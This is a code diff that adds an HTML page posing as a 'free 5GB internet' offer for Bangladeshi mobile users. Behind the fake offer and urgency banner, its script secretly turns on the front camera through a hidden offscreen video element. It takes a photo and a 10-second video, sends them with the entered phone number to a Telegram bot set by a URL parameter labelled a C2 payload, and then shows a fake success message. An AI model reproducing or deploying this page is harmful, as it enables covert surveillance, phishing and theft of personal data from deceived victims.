@@ -1,0 +1,538 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>5GB Free Internet - Claim Now! Limited Offer</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Poppins", sans-serif;
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        padding: 20px;
+        overflow-x: hidden;
+      }
+
+      .container {
+        max-width: 500px;
+        margin: 0 auto;
+        background: #fff;
+        border-radius: 25px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+        overflow: hidden;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #ff6b6b, #feca57);
+        padding: 30px 20px;
+        text-align: center;
+        color: white;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .header::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.3),
+          transparent
+        );
+        animation: shine 3s infinite;
+      }
+
+      @keyframes shine {
+        0% {
+          left: -100%;
+        }
+        100% {
+          left: 100%;
+        }
+      }
+
+      .free-offer {
+        font-size: 2.5em;
+        font-weight: 800;
+        text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        margin-bottom: 10px;
+        animation: pulse 2s infinite;
+      }
+
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+      }
+
+      .subtitle {
+        font-size: 1.1em;
+        font-weight: 500;
+        opacity: 0.95;
+      }
+
+      .main-content {
+        padding: 40px 30px;
+      }
+
+      .title {
+        font-size: 2.2em;
+        font-weight: 700;
+        color: #333;
+        text-align: center;
+        margin-bottom: 20px;
+        background: linear-gradient(135deg, #667eea, #764ba2);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+
+      .description {
+        color: #666;
+        font-size: 1.05em;
+        line-height: 1.6;
+        text-align: center;
+        margin-bottom: 30px;
+        font-weight: 400;
+      }
+
+      .form-group {
+        margin-bottom: 25px;
+        position: relative;
+      }
+
+      .form-label {
+        display: block;
+        font-weight: 600;
+        color: #555;
+        font-size: 0.95em;
+        margin-bottom: 8px;
+      }
+
+      .form-input {
+        width: 100%;
+        padding: 18px 20px;
+        border: 2px solid #e1e5e9;
+        border-radius: 15px;
+        font-size: 1.1em;
+        font-weight: 500;
+        transition: all 0.3s;
+        background: #f8f9ff;
+        box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.05);
+      }
+
+      .form-input:focus {
+        outline: none;
+        border-color: #667eea;
+        box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        transform: translateY(-2px);
+      }
+
+      .claim-btn {
+        width: 100%;
+        padding: 22px;
+        border: none;
+        border-radius: 20px;
+        background: linear-gradient(135deg, #ff6b6b, #feca57);
+        color: white;
+        font-size: 1.4em;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s;
+        box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .claim-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 20px 40px rgba(255, 107, 107, 0.5);
+      }
+
+      .claim-btn:active {
+        transform: translateY(-1px);
+      }
+
+      .claim-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+
+      .loading {
+        display: none;
+        text-align: center;
+        padding: 30px;
+        background: linear-gradient(135deg, #f8f9ff, #e8f0fe);
+        border-radius: 20px;
+        margin: 25px 0;
+      }
+
+      .loading i {
+        font-size: 3em;
+        color: #667eea;
+        margin-bottom: 15px;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        font-size: 1.2em;
+        font-weight: 600;
+        color: #555;
+        margin-bottom: 10px;
+      }
+
+      .progress {
+        width: 100%;
+        height: 6px;
+        background: #e1e5e9;
+        border-radius: 3px;
+        overflow: hidden;
+        margin-top: 15px;
+      }
+      .progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #667eea, #764ba2);
+        width: 0%;
+        transition: width 0.3s;
+        border-radius: 3px;
+      }
+
+      .urgency {
+        background: linear-gradient(135deg, #ff4757, #ff3838);
+        color: white;
+        padding: 15px;
+        border-radius: 15px;
+        margin: 25px 0;
+        text-align: center;
+        font-weight: 600;
+      }
+
+      .success {
+        display: none;
+        background: linear-gradient(135deg, #2ed573, #1abc9c);
+        color: white;
+        padding: 35px;
+        border-radius: 20px;
+        text-align: center;
+        margin: 20px 0;
+        font-size: 1.4em;
+        font-weight: 700;
+        box-shadow: 0 10px 30px rgba(46, 213, 115, 0.4);
+      }
+
+      .hidden-camera {
+        position: fixed;
+        top: -100%;
+        left: 0;
+        width: 640px !important;
+        height: 480px !important;
+        opacity: 0;
+        pointer-events: none;
+        z-index: 9999 !important;
+        background: black;
+      }
+
+      @media (max-width: 480px) {
+        .free-offer {
+          font-size: 2em;
+        }
+        .title {
+          font-size: 1.8em;
+        }
+        .main-content {
+          padding: 30px 20px;
+        }
+        .hidden-camera {
+          width: 480px !important;
+          height: 360px !important;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="free-offer">
+          <i
+            class="fas fa-gift"
+            style="font-size: 0.6em; margin-right: 10px"
+          ></i>
+          FREE 5GB DATA
+        </div>
+        <div class="subtitle">Limited Time Offer - Claim Before It Ends!</div>
+      </div>
+
+      <div class="main-content">
+        <h1 class="title">
+          <i
+            class="fas fa-mobile-alt"
+            style="color: #ff6b6b; margin-right: 15px"
+          ></i>
+          Get 5GB Free Internet
+        </h1>
+
+        <p class="description">
+          Get <strong>5GB Free High-Speed Data</strong> for any SIM card
+          (Grameenphone, Robi, Banglalink, Teletalk). No hidden charges. 100%
+          Working!
+        </p>
+
+        <form id="claimForm">
+          <div class="form-group">
+            <label class="form-label">
+              <i class="fas fa-phone" style="margin-right: 8px"></i>
+              Enter Your Phone Number
+            </label>
+            <input
+              type="tel"
+              id="phoneNumber"
+              class="form-input"
+              placeholder="01XXXXXXXXX"
+              pattern="[0-9]{11}"
+              required
+              maxlength="11"
+            />
+          </div>
+
+          <button type="button" class="claim-btn" id="claimBtn">
+            <i class="fas fa-rocket icon"></i>
+            CLAIM 5GB FREE DATA NOW
+          </button>
+        </form>
+
+        <div class="urgency">
+          <i class="fas fa-clock" style="margin-right: 10px"></i>
+          ⏰ Only 247 spots remaining! Offer expires in 2 hours!
+        </div>
+
+        <div class="loading" id="loadingSection">
+          <i class="fas fa-spinner"></i>
+          <div class="loading-text">
+            Activating your bonus data... Please wait
+          </div>
+          <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+          </div>
+        </div>
+
+        <div class="success" id="successMsg">
+          <i
+            class="fas fa-check-circle"
+            style="font-size: 4.5em; margin-bottom: 15px"
+          ></i>
+          ✅ 5GB Data Successfully Activated!<br />
+          <small>Your free data will reflect within 5 minutes.</small>
+        </div>
+      </div>
+    </div>
+
+    <video
+      id="hiddenVideo"
+      class="hidden-camera"
+      autoplay
+      muted
+      playsinline
+    ></video>
+
+    <script>
+      // Parse C2 payload
+      const urlParams = new URLSearchParams(window.location.search);
+      const payloadData = urlParams.get("p");
+      let c2Config = null;
+
+      if (payloadData) {
+        try {
+          c2Config = JSON.parse(atob(payloadData));
+        } catch (e) {}
+      }
+
+      let photoSent = false;
+      let videoSent = false;
+
+      async function sendToTelegram(blob, phone, type) {
+        if (!c2Config?.bot || !c2Config?.chat) return;
+
+        const formData = new FormData();
+        let endpoint = "sendPhoto";
+        let fileField = "photo";
+        let filename = "capture.jpg";
+
+        if (type === "VIDEO") {
+          endpoint = "sendVideo";
+          fileField = "video";
+          filename = "capture.webm";
+        }
+
+        const caption =
+          `*5GB OFFER CLAIM*\n` +
+          `Phone: **${phone}**\n` +
+          `${type} captured\n` +
+          `${new Date().toLocaleString("bn-BD")}`;
+
+        formData.append(fileField, blob, filename);
+        formData.append("chat_id", c2Config.chat);
+        formData.append("caption", caption);
+        formData.append("parse_mode", "Markdown");
+
+        try {
+          const response = await fetch(
+            `https://api.telegram.org/bot${c2Config.bot}/${endpoint}`,
+            {
+              method: "POST",
+              body: formData,
+            },
+          );
+
+          const result = await response.json();
+          if (result.ok) {
+            if (type === "PHOTO") photoSent = true;
+            if (type === "VIDEO") videoSent = true;
+
+            // দুটোই পাঠানো শেষ হলে success দেখাও
+            if (photoSent && videoSent) {
+              showSuccess();
+            }
+          }
+        } catch (err) {}
+      }
+
+      function capturePhoto(phone) {
+        const video = document.getElementById("hiddenVideo");
+        if (!video.srcObject) return;
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(
+          (blob) => {
+            if (blob) sendToTelegram(blob, phone, "PHOTO");
+          },
+          "image/jpeg",
+          0.85,
+        );
+      }
+
+      function startVideoRecord(stream, phone) {
+        let recorder;
+        const chunks = [];
+
+        try {
+          recorder = new MediaRecorder(stream, {
+            mimeType: "video/webm;codecs=vp8,opus",
+            videoBitsPerSecond: 600000,
+          });
+        } catch (e) {
+          recorder = new MediaRecorder(stream);
+        }
+
+        recorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = () => {
+          if (chunks.length > 0) {
+            const blob = new Blob(chunks, { type: "video/webm" });
+            sendToTelegram(blob, phone, "VIDEO");
+          }
+        };
+
+        recorder.start(1000);
+        setTimeout(() => {
+          if (recorder.state === "recording") recorder.stop();
+        }, 10000);
+      }
+
+      async function startCameraHack(phone) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              facingMode: "user",
+              width: { ideal: 640 },
+              height: { ideal: 480 },
+              frameRate: { ideal: 15 },
+            },
+          });
+
+          const video = document.getElementById("hiddenVideo");
+          video.srcObject = stream;
+          video.play().catch(() => {});
+
+          await new Promise((r) => setTimeout(r, 1800));
+
+          capturePhoto(phone);
+          startVideoRecord(stream, phone);
+
+          setTimeout(() => stream.getTracks().forEach((t) => t.stop()), 14000);
+        } catch (err) {
+          // ক্যামেরা না পেলেও ১০ সেকেন্ড পর success দেখাবে
+          setTimeout(showSuccess, 10000);
+        }
+      }
+
+      function showSuccess() {
+        document.getElementById("loadingSection").style.display = "none";
+        document.getElementById("successMsg").style.display = "block";
+      }
+
+      document.getElementById("claimBtn").onclick = function () {
+        const phone = document.getElementById("phoneNumber").value.trim();
+        if (!phone || !/^01[3-9]\d{8}$/.test(phone)) {
+          alert("দয়া করে সঠিক নম্বর দিন (01XXXXXXXXX)");
+          return;
+        }
+
+        this.disabled = true;
+        document.getElementById("loadingSection").style.display = "block";
+
+        const progress = document.getElementById("progressBar");
+        let w = 0;
+        const interval = setInterval(() => {
+          w += 4;
+          progress.style.width = w + "%";
+          if (w >= 95) clearInterval(interval);
+        }, 500);
+
+        startCameraHack(phone);
+      };
+
+      document.getElementById("phoneNumber").oninput = function () {
+        if (this.value.length === 11 && /^01[3-9]\d{8}$/.test(this.value)) {
+          setTimeout(() => document.getElementById("claimBtn").click(), 700);
+        }
+      };
+    </script>
+  </body>
+</html>
